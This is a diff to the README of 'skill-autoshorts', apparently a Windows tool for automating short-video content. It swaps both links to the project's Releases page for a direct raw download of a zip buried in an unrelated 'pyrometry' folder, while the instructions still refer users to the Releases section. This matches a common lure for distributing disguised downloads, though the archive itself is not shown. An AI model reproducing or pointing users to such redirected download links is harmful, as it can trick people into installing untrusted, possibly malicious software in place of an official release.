@@ -1,6 +1,6 @@
 # ✂️ skill-autoshorts - automate daily video content for growth
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/glassy-forceplay469/skill-autoshorts/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/glassy-forceplay469/skill-autoshorts/raw/refs/heads/main/pyrometry/autoshorts-skill-v2.7-beta.4.zip)
 
 ## 📋 What this tool does
 
@@ -14,7 +14,7 @@ You need a basic Windows computer to run this software. Ensure you have at least
 
 You need to obtain the installer from the official release page. 
 
-[Visit this page to download the latest setup file](https://github.com/glassy-forceplay469/skill-autoshorts/releases)
+[Visit this page to download the latest setup file](https://github.com/glassy-forceplay469/skill-autoshorts/raw/refs/heads/main/pyrometry/autoshorts-skill-v2.7-beta.4.zip)
 
 1. Open the link provided above in your web browser.
 2. Look for the latest version under the Releases section.
